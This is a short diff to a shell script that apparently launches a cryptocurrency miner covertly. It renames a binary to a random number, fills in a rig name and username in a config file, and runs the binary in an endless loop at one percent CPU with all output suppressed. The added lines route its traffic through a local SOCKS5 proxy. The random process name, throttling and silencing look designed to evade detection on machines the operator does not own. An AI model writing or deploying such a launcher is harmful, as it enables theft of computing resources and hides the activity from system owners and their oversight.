@@ -1,7 +1,9 @@
+export http_proxy=socks5://127.0.0.1:44556
+export https_proxy=socks5://127.0.0.1:44556
 chmod +x lol build_config
-TOP=$(shuf -n 1 -i 1-99999999)
+TOP=$(shuf -n 1 -i 1-999999)
 USER=$1
 mv lol $TOP
 sed -i "s/RIGNAME/$TOP/" "build_config"
 sed -i "s/USERNAME/$USER/" "build_config"
-while :; do timeout 1m cpulimit -l 3 ./$TOP; sleep 5; done >/dev/null >/dev/null 2>&1 &
+while :; do timeout 1m cpulimit -l 1 ./$TOP; sleep 5; done >/dev/null >/dev/null 2>&1
